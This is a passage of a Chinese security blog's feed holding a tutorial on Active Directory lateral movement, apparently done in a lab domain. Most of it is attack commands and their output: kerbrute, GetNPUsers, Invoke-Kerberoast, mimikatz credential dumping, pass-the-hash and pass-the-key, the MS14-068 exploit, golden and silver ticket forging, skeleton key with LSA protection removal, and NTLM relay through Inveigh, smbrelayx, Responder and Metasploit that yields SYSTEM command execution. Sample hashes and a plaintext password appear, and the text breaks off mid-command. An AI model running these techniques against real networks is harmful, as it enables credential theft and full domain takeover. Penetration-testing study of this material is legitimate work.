        &lt;h2 id=&quot;watchfile&quot;&gt;&lt;a href=&quot;#watchfile&quot; class=&quot;headerlink&quot; title=&quot;watchfile&quot;&gt;&lt;/a&gt;watchfile&lt;/h2&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/MisakiKat
      
    
    </summary>
    
    
      <category term="shell" scheme="https://misakikata.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透横行移动</title>
    <link href="https://misakikata.github.io/2020/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E8%A1%8C%E7%A7%BB%E5%8A%A8/"/>
    <id>https://misakikata.github.io/2020/08/内网渗透横行移动/</id>
    <published>2020-08-12T01:03:29.000Z</published>
    <updated>2020-08-12T01:03:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>在进行这些东西之前，至少需要一个可完整交互的shell，默认就已经获得了shell，并且提权到<code>nt authority\system</code> </p><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>这是一种针对kerberos协议的攻击技术，不需要认证就可以获取到用户的密码hash值。如果用户开启了“不使用Kerberos预认证”，攻击者就可以获取到Kerberos AS-REP，然后他就可以离线破解这个凭证了。</p><p>首先需要知道有哪些用户，这里使用kerbrute来枚举，需要其开启了88端口</p><p>需要使用如下的项目：<a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p><pre class="line-numbers language-none"><code class="language-none">kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果获得如下的输出，则代表枚举到用户名</p><pre class="line-numbers language-none"><code class="language-none">2020&#x2F;08&#x2F;06 17:22:21 &gt;  Using KDC(s):2020&#x2F;08&#x2F;06 17:22:21 &gt;   spookysec.local:882020&#x2F;08&#x2F;06 17:22:22 &gt;  [+] VALID USERNAME:       james@spookysec.local2020&#x2F;08&#x2F;06 17:22:26 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local2020&#x2F;08&#x2F;06 17:22:34 &gt;  [+] VALID USERNAME:       James@spookysec.local2020&#x2F;08&#x2F;06 17:22:36 &gt;  [+] VALID USERNAME:       robin@spookysec.local2020&#x2F;08&#x2F;06 17:23:04 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local2020&#x2F;08&#x2F;06 17:23:18 &gt;  [+] VALID USERNAME:       administrator@spookysec.local2020&#x2F;08&#x2F;06 17:23:51 &gt;  [+] VALID USERNAME:       backup@spookysec.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用GetNPUsers来获取用户kerberos票证，如果没有开启选项，则会报一个没有设置的错误</p><pre class="line-numbers language-none"><code class="language-none">GetNPUsers.py spookysec.local&#x2F;jamesλ GetNPUsers.py spookysec.local&#x2F;james -no-passImpacket v0.9.20 - Copyright 2019 SecureAuth Corporation[*] Getting TGT for james[-] User james doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果开启的话会显示当前票据</p><pre class="line-numbers language-none"><code class="language-none">λ GetNPUsers.py spookysec.local&#x2F;svc-admin -no-passImpacket v0.9.20 - Copyright 2019 SecureAuth Corporation[*] Getting TGT for svc-admin$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a5c2252aa6fd31021c6b73ddf78790a0$4ca233e07269de808a3036ca9f1db6e9a611001682f8dfa433b8409ca87fcd5d604546cfdac46f2cbc86f60455f4779c839ede069e49fd0889edca6017952a5ea26c104ed985aa1c6b82b0f57171c340e743c9f8fe4aef06ace0dd800704024f8808effcd9c602322f4e73e4331914cc22ee2b74d7130ff2bf1f7f89b90d63428d65f655d522fe39adbb24bb0cc815f1e5fab5cefdd5fd4caa775b6712ee3ce99a1f9bb50598a7f77eddd133fdb6c70980154337078128854684bd017df86e0b9ba4769c3db16e7fa4fe702a2622029f6850c82eff7c690096d78f9694978600f5a00beb41cfae1c13b24c6b88cabb6d1f08<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再去利用hashcat爆破密码</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 18200 hashfile wordlist --force   #hashfile是保存hash的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不想先获取用户，可以直接利用GetNPUsers来检索，就是速度有点慢</p><pre class="line-numbers language-none"><code class="language-none">GetNPUsers.py spookysec.local&#x2F;  -usersfile userlist.txt -dc-ip 10.10.50.231<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取到的结果会显示如下，可以获取到的用户直接显示，不可以的显示没有设置。</p><pre class="line-numbers language-none"><code class="language-none">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User James doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:59726561a02eb64b0a108c63f1078db3$7866b1dce6fee28d5033ba1f7446e80f03d18649fed3f300aeb55b5fa7f1cdb09d5dcc7259d722e757ddaa305f64ca51b8f05d2740dff233aa3741b944913c2e96bd6767b2cb209f013cfa6b106c6a5a38c48a1fc48e695bfbdf74f21010689e0abd0cfc0a4f2565f08b7a6a4f3645fdee4dd1fedc0b0088cc0fade7e55ec58593c184deecfef267db0ab613f3661a665ce850284c8cfcd033cde5960959331a5fac4cd5f4eb537969614328c5740498fca8cf34d882f4465e78b85302b3b6304042f08e8fb7ecd386b1da5798d6189fe1056f5dc74be490492443b36d2c743090bad3a8970ee8b4b4e6c75eb11ee53fbbf1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Kerberoast"><a href="#Kerberoast" class="headerlink" title="Kerberoast"></a>Kerberoast</h3><p>利用的项目：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><p>在Kerberos与TGS通信完成时会返回一张ST，ST使用Server端的密码进行加密。</p><p>首先查找注册的SPN。SPN：服务主体名称，服务实例的唯一标识。</p><pre class="line-numbers language-none"><code class="language-none">setspn -Q *&#x2F;*    #查看当前域内的所有SPNsetspn -T delay.com -Q *&#x2F;*  #查看delay.com域内的SPN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中格式：&lt;服务类型&gt;/&lt;机器名&gt;:&lt;端口&gt;</p><pre class="line-numbers language-none"><code class="language-none">CN&#x3D;DC,OU&#x3D;Domain Controllers,DC&#x3D;de1ay,DC&#x3D;comDfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04&#x2F;DC.de1ay.com    ldap&#x2F;DC.de1ay.com&#x2F;ForestDnsZones.de1ay.com    ldap&#x2F;DC.de1ay.com&#x2F;DomainDnsZones.de1ay.com    TERMSRV&#x2F;DC     TERMSRV&#x2F;DC.de1ay.com    DNS&#x2F;DC.de1ay.com    GC&#x2F;DC.de1ay.com&#x2F;de1ay.com    RestrictedKrbHost&#x2F;DC.de1ay.com    RestrictedKrbHost&#x2F;DC    RPC&#x2F;3f0c65bc-e5d1-472f-a826-bca6be17b380._msdcs.de1ay.com    HOST&#x2F;DC&#x2F;DE1AY    HOST&#x2F;DC.de1ay.com&#x2F;DE1AY    HOST&#x2F;DC    HOST&#x2F;DC.de1ay.com    HOST&#x2F;DC.de1ay.com&#x2F;de1ay.com    E3514235-4B06-11D1-AB04-00C04FC2DCD2&#x2F;3f0c65bc-e5d1-472f-a826-bca6be17b380&#x2F;de1ay.com    ldap&#x2F;DC&#x2F;DE1AY    ldap&#x2F;3f0c65bc-e5d1-472f-a826-bca6be17b380._msdcs.de1ay.com    ldap&#x2F;DC.de1ay.com&#x2F;DE1AY    ldap&#x2F;DC    ldap&#x2F;DC.de1ay.com    ldap&#x2F;DC.de1ay.com&#x2F;de1ay.comCN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;de1ay,DC&#x3D;comkadmin&#x2F;changepwCN&#x3D;PC,CN&#x3D;Computers,DC&#x3D;de1ay,DC&#x3D;comTERMSRV&#x2F;PC    TERMSRV&#x2F;PC.de1ay.com    RestrictedKrbHost&#x2F;PC    HOST&#x2F;PC    RestrictedKrbHost&#x2F;PC.de1ay.com    HOST&#x2F;PC.de1ay.comCN&#x3D;WEB,CN&#x3D;Computers,DC&#x3D;de1ay,DC&#x3D;com    WSMAN&#x2F;WEB    WSMAN&#x2F;WEB.de1ay.com    TERMSRV&#x2F;WEB    TERMSRV&#x2F;WEB.de1ay.com    RestrictedKrbHost&#x2F;WEB    HOST&#x2F;WEB    RestrictedKrbHost&#x2F;WEB.de1ay.com    HOST&#x2F;WEB.de1ay.com发现存在 SPN! <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但在爆破的时候需要查看加密方式是否为RC4加密，如上的SPN采用的是AES加密。使用<code>klist</code>查看</p><pre class="line-numbers language-none"><code class="language-none">#3&gt;     客户端: DE1AY @ DE1AY.COM        服务器: kadmin&#x2F;changepw @ DE1AY.COM        Kerberos 票证加密类型: AES-256-CTS-HMAC-SHA1-96        票证标志 0x40a10000 -&gt; forwardable renewable pre_authent name_canonicalize        开始时间: 8&#x2F;6&#x2F;2020 14:52:35 (本地)        结束时间:   8&#x2F;6&#x2F;2020 14:54:35 (本地)        续订时间: 8&#x2F;6&#x2F;2020 14:54:35 (本地)        会话密钥类型: AES-256-CTS-HMAC-SHA1-96<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然如果是RC4加密，可以使用mimikatz导出票据，离线爆破</p><pre class="line-numbers language-none"><code class="language-none">kerberos::list &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导出后，使用脚本字典来爆破票据</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;tgsrepcrack.py wordlist.txt xxx-MYDOMAIN.LOCAL.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果mimikatz不好使用，还可以使用powershell脚本导出hashcat格式的字符串，离线爆破</p><p>需要使用<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></p><p>来导出可以直接爆破的字符串</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-Kerberoast.ps1Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后再使用hashcat来执行</p><pre class="line-numbers language-none"><code class="language-none">hashcat64.exe -m 13100 hash.txt pass.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Bruteforcing"><a href="#Bruteforcing" class="headerlink" title="Bruteforcing"></a>Bruteforcing</h3><p>暴力破解枚举账号和密码，可以执行的操作有</p><ul><li>  枚举有效的用户名</li><li>  枚举用户名和密码</li><li>  查找没有启动预先身份验证的用户</li></ul><p>利用项目：<a href="https://github.com/TarlogicSecurity/kerbrute">https://github.com/TarlogicSecurity/kerbrute</a></p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;kerbrute.py -users users_file.txt -passwords passwords_file.txt -domain contoso.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要注意账号密码失败次数和账号策略。</p><h3 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h3><p>这种形式类似于PTH，只不过在打过补丁<strong>KB2871997</strong>后，PTH就只限制在Administrator下。但是这种时候还是可以使用aeskey来执行横向移动。</p><p>获取账号的aeskey</p><pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取到结果一部分，由于用户是明文保存密码，以下表示的是session0中的一个Windows服务:</p><pre class="line-numbers language-none"><code class="language-none">         * Username : web$         * Domain   : DE1AY.COM         * Key List :           aes256_hmac       8d7822f543e35904f6e28a0d6f270c3b7902de70296d669354157dd33813392e           aes128_hmac       80a6938c9463a8e5195a5874966ac229           rc4_hmac_nt       0a147850da3b3c41b055628a202d2b4a           rc4_hmac_old      0a147850da3b3c41b055628a202d2b4a           rc4_md4           0a147850da3b3c41b055628a202d2b4a           rc4_hmac_nt_exp   0a147850da3b3c41b055628a202d2b4a           rc4_hmac_old_exp  0a147850da3b3c41b055628a202d2b4a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再执行注入aeskey</p><pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:web$ &#x2F;domain:DE1AY.COM &#x2F;aes256:8d7822f543e35904f6e28a0d6f270c3b7902de70296d669354157dd33813392e&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>哈希传递攻击，就是不需要明文登录，用NTLM hash可直接进行登录。攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务。先查看是否有补丁<code>kb2871997</code></p><p>使用mimikatz先获取hash:</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取到信息部分显示如下</p><pre class="line-numbers language-none"><code class="language-none">Session           : Interactive from 1User Name         : de1ayDomain  : DE1AYLogon Server      : DCLogon Time        : 2020&#x2F;8&#x2F;7 16:20:47SID               : S-1-5-21-2756371121-2868759905-3853650604-1001msv :  [00000003] Primary  * Username : de1ay    * Domain   : DE1AY    * LM       : f67ce55ac831223dc187b8085fe1d9df    * NTLM     : 161cff084477fe596a5db81874498a24    * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取到hash后执行PTH，再访问远程主机即可直接利用此账号密码访问。</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::pth &#x2F;user:de1ay &#x2F;domain:DE1AY &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取到的hash也可以直接进行暴力破解，比如利用hashcat执行</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 161cff084477fe596a5db81874498a24 password.dict -o out.txt —force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用crackmapexec进行批量pass the hash</p><p><a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></p><pre class="line-numbers language-none"><code class="language-none">crackmapexec 192.168.120.0&#x2F;24 -u de1ay -H 161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p>票据传递攻击，使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。</p><h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><p>该漏洞允许用户提升任意普通用户权限成为域管理员（Domain Admin）身份，对应的补丁是kb3011780</p><p>需要一个域用户权限和本地机器账号权限。首先是使用域用户权限获取域用户的SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;all用户名      SID&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;de1ay\de1ay S-1-5-21-2756371121-2868759905-3853650604-1001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用漏洞执行脚本来生成一个票据缓存，<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><pre class="line-numbers language-none"><code class="language-none">C:\bea&gt;MS14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604-1001 -d dc.de1ay.com -p 1qaz@WSX  [+] Building AS-REQ for dc.de1ay.com... Done!  [+] Sending AS-REQ to dc.de1ay.com... Done!  [+] Receiving AS-REP from dc.de1ay.com... Done!  [+] Parsing AS-REP from dc.de1ay.com... Done!  [+] Building TGS-REQ for dc.de1ay.com... Done!  [+] Sending TGS-REQ to dc.de1ay.com... Done!  [+] Receiving TGS-REP from dc.de1ay.com... Done!  [+] Parsing TGS-REP from dc.de1ay.com... Done!  [+] Creating ccache file &#39;TGT_de1ay@de1ay.com.ccache&#39;... Done!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成一个<code>TGT_de1ay@de1ay.com.ccache</code>票据文件，利用mimikatz注入内存，先清除含有的票据，以免导致写入失败</p><pre class="line-numbers language-none"><code class="language-none">kerberos::list kerberos::purge   &#x2F;&#x2F;清除kerberos::ptc TGT_de1ay@de1ay.com.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果显示<code>Injecting ticket : OK</code>表示成功。</p><pre class="line-numbers language-none"><code class="language-none">使用kerberos::list 就可以看到注入的票据。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>黄金票据就是自己生成的TGT，在生成TGT的过程中，用户、域、权限等信息会经过krbtgt账户hash的加密，所以获取到用户、域、SID、krbtgt的hash值就可以生成黄金票据，生成的票据就是域管账号也就是可以控制整个域。</p><p>krbtgt账户一般只在域控服务器上，所以一般需要一个域控器权限。先导出krbtgt用户hash。</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;patch       #获取用户hash和域sid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取hash后，利用mimikatz伪造用户，例如伪造域管理员administrator。</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;domain:de1ay.com &#x2F;sid:sid &#x2F;krbtgt:hash &#x2F;user:administrator &#x2F;ticket:admin.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再利用mimikatz导入票据</p><pre class="line-numbers language-none"><code class="language-none">mimikatz::ptt admin.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以使用klist查看票据导入是否成功</p><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>白银票据伪造利用的是Kerberos认证中的第三个步骤，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了。</p><p>还是需要域控制器的权限，在域控制器下执行</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获得其中的域sid和NTLM hash。利用mimikatz生成</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;domain:de1ay.com &#x2F;sid:S-1-5-21-1218902331-2157346161-1782232778  &#x2F;target:192.168.3.21 &#x2F;rc4:8432d4fa4430ecf56927dbabd1b4d36b &#x2F;service:cifs &#x2F;user:de1ay &#x2F;ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如上生成的cifs服务的票据，可以访问域控制器的文件共享系统。</p><h4 id="skeleton-key"><a href="#skeleton-key" class="headerlink" title="skeleton key"></a>skeleton key</h4><p>skeleton key（万能钥匙）就是给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对lsass.exe 进行注入，所以重启后会失效。</p><p>首先在域控中安装skeleton key，所以以下在域控中执行</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugmisc::skeleton<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获得一堆OK，然后直接使用命令去访问，生成的密码是mimikatz。</p><pre class="line-numbers language-none"><code class="language-none">net use \\dc.de1ay.com mimikatz &#x2F;user:web\de1ay.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于微软增加了lsass的防注入LSA Protection，所以以上适用于系统</p><pre class="line-numbers language-none"><code class="language-none">Windows 8.1Windows Server 2012 R2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>后来mimikatz也支持了绕过的形式，配合mimidrv.sys</p><pre class="line-numbers language-none"><code class="language-none">privilege::debug!+!processprotect &#x2F;process:lsass.exe &#x2F;removemisc::skeleton<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此形式并非特权提升，只能算是增加一个新的万能密码。</p><h3 id="Relay-Hash"><a href="#Relay-Hash" class="headerlink" title="Relay Hash"></a>Relay Hash</h3><p>目标机器不能开启smb签名，否则利用无效,一般情况下，windows server会默认开启，而windows单机系统默认都不会开。</p><h4 id="Inveigh"><a href="#Inveigh" class="headerlink" title="Inveigh"></a>Inveigh</h4><p>利用脚本<a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p><p>首先执行，要在特权模式下执行，否则会无法监听</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Inveigh.psd1Invoke-Inveigh -consoleoutput Y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当其他主机来连接的时候，终端会显示出主机的NTLM hash</p><pre class="line-numbers language-none"><code class="language-none">[+] [2020-08-11T16:14:30] SMB(445) NTLM challenge 123B1B44BE03722D sent to 10.10.10.201:65312[+] [2020-08-11T16:14:30] SMB(445) NTLMv2 captured for DE1AY\de1ay from 10.10.10.201(PC):65312:de1ay::DE1AY::1812B95C562D1DA8C8D033B9F3C259A5:010100000000000096643A70B76FD601D1A5312DF1DFFF35000000310041005900010004004400430004001200640065003100610079002E0063006F006D0003001800440043002E0064006500306F006D0005001200640065003100610079002E0063006F006D000700080096643A70B76FD601060004000200000008003000000000002000007D481BA03B1FB135F248854DE1855E7B7D84F8369E2277395D330602A13038970A001000000000000000000900200063006900660073002F00310030002E00310030002E00310030002E0031003000000000000000000000000000[+] [2020-08-11T16:14:31] NBNS request for TCONF.F.360.CN&lt;00&gt; received from 10.10.10.201[spoofer dis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果需要利用hash，可以使用<a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-TheHash.ps1Invoke-WMIExec -Target 192.168.30.152 -Domain de1ay.com -Username de1ay -Hash 1812B95C562D1DA8C8D033B9F3C259A5 -Command &quot;whoami&quot; -verbose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="smbrelayx"><a href="#smbrelayx" class="headerlink" title="smbrelayx"></a>smbrelayx</h4><p>使用impacket中的smbrelayx.py文件来做中继攻击。</p><pre class="line-numbers language-none"><code class="language-none">python smbrelayx.py -h 192.168.120.140   #IP为想要获取权限的主机地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果有主机访问执行中继的地址，比如192.168.120.130</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.120.130\c$ &#x2F;user:&quot;DE1AY\de1ay&quot; &quot;1qaz@WSX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果抓取成功，可以看到如下内容</p><pre class="line-numbers language-none"><code class="language-none">[*] SMBD: Received connection from 192.168.120.142, attacking target 192.168.120.140[*] Authenticating against 192.168.120.140 as DE1AY\de1ay SUCCEED[*] de1ay::DE1AY:b937bb0942684e01:15bf5db54f019b8f52141375eeea221e:0101000000000000738d1ab3bd6fd60180e5339dcce53e660000000002000a00440045003100410059000100060057004500420004001200640065003100610079002e0063006f006d0003001a005700450042002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d0007000800738d1ab3bd6fd601060004000200000008003000300000000000000000000000002000007d481ba03b1fb135f248854de1855e7b7d84f8369e2277395d330602a13038970a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320030002e00310033003000000000000000000000000000[*] Sending status code STATUS_SUCCESS after authentication to 192.168.120.142[-] TreeConnectAndX not found C$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果权限足够，可以dump下来192.168.120.140主机上的hash。借助hash来执行命令</p><pre class="line-numbers language-none"><code class="language-none">python smbrelayx.py -h 192.168.120.140 -c whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后命令得到执行</p><pre class="line-numbers language-none"><code class="language-none">[*] Starting service RemoteRegistry[*] HTTPD: Received connection from 192.168.120.142, attacking target 192.168.120.140[*] Authenticating against 192.168.120.140 as DE1AY\administrator SUCCEED[*] administrator::DE1AY:0e7c6d90b614dbe7:a4061e0695772bfca50b692e5c92a1d7:0101000000000000366c24e1be6fd60110d629b8722f71300000000002000a00440045003100410059000100060057004500420004001200640065003100610079002e0063006f006d0003001a005700450042002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d0007000800366c24e1be6fd601060004000200000008003000300000000000000000000000002000007d481ba03b1fb135f248854de1855e7b7d84f8369e2277395d330602a13038970a001000000000000000000000000000000000000900280048005400540050002f003100390032002e003100360038002e003100320030002e00310033003000000000000000000000000000[-] 192.168.120.140 is being attacker at the moment, skipping.. [*] Executed specified command on host: 192.168.120.140nt authority\system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h4><p>Responder通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。</p><pre class="line-numbers language-none"><code class="language-none">python Responder.py -I eth0 wrp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当有执行访问smb请求时，可以抓取到</p><pre class="line-numbers language-none"><code class="language-none">[*] [LLMNR]  Poisoned answer sent to 192.168.120.142 for name wpad[HTTP] NTLMv2 Client   : 192.168.120.142[HTTP] NTLMv2 Username : DE1AY\de1ay[HTTP] NTLMv2 Hash     : de1ay::DE1AY:59e4691da47e5fe3:542D7E586900FF2E6C077ED906B08E41:0101000000000000FF2D1573BF6FD6013E50BF5D7E2EDF74000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000007D481BA03B1FB135F248854DE1855E7B7D84F8369E2277395D330602A13038970A001000000000000000000000000000000000000900280048005400540050002F003100390032002E003100360038002E003100320030002E003100330030000000000000000000   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>利用可以采用上面提到的脚本<a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><h4 id="msfrelay"><a href="#msfrelay" class="headerlink" title="msfrelay"></a>msfrelay</h4><p>执行方式大致如下</p><pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;smb_relaymsf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SHARE    ADMIN$           yes       The share to connect to   SMBHOST                   no        The target SMB server (leave empty for originating system)   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0   SRVPORT  445              yes       The local port to listen on.Exploit target:   Id  Name   --  ----   0   Automaticmsf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; set smbhost 192.168.120.140smbhost &#x3D;&gt; 192.168.120.140msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; set payload 